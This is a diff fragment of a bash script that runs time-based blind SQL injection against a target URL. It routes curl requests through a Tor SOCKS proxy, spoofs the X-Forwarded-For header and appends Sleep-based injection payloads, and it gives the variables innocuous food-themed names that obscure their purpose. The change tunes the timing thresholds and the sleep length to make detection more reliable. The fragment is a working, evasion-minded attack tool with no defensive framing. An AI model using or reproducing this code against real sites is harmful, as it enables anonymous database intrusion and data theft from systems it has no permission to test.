@@ -58,8 +58,8 @@ time_audit_engine() {
     local stopwatch_seconds=$(curl --socks5-hostname 127.0.0.1:9050 -m 12 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$secret_msg_powder")
     echo -e "[i] Total Response Time: \e[0;32m${stopwatch_seconds}s\e[0m"
 
-    if (( $(echo "$stopwatch_seconds > 5.0" | bc -l) )); then
-        local warm_rice_bowl="${extra_spicy_sauce}Sleep(2)))v)--+"
+    if (( $(echo "$stopwatch_seconds > 3.0" | bc -l) )); then
+        local warm_rice_bowl="${extra_spicy_sauce}Sleep(1)))v)--+"
         local wash_hands_now=$(curl --socks5-hostname 127.0.0.1:9050 -m 8 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$warm_rice_bowl")
 
         if (( $(echo "$wash_hands_now > 2.0" | bc -l) )) && (( $(echo "$wash_hands_now < 4.0" | bc -l) )); then
